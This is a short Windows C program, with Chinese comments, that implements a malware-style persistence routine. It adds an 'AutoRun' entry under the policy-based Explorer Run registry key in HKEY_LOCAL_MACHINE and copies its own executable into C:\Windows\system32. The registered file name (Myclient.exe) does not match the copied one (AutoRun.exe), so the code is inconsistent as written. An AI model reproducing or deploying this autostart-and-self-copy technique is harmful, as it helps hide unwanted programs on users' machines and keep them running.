#include <Windows.h>

int main()
{
	char					szModlePath[MAX_PATH];
	HKEY					hkResult;

	char *pszRegName = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run";
	char *pszKeyValue = "C:\\Windows\\system32\\Myclient.exe";

	// 打开键值
	RegOpenKeyA(HKEY_LOCAL_MACHINE, pszRegName, &hkResult);

	// 设置键值
	RegSetValueExA(hkResult, "AutoRun", 0, REG_EXPAND_SZ, (CONST BYTE*)pszKeyValue, strlen(pszKeyValue));
	
	// 关闭键值
	RegCloseKey(hkResult);

	// 获取自身路径
	GetModuleFileNameA(NULL, szModlePath, MAX_PATH);

	// 把自身复制到系统目录中
	CopyFileA(szModlePath, "C:\\Windows\\system32\\AutoRun.exe", TRUE);

	return 0;
}
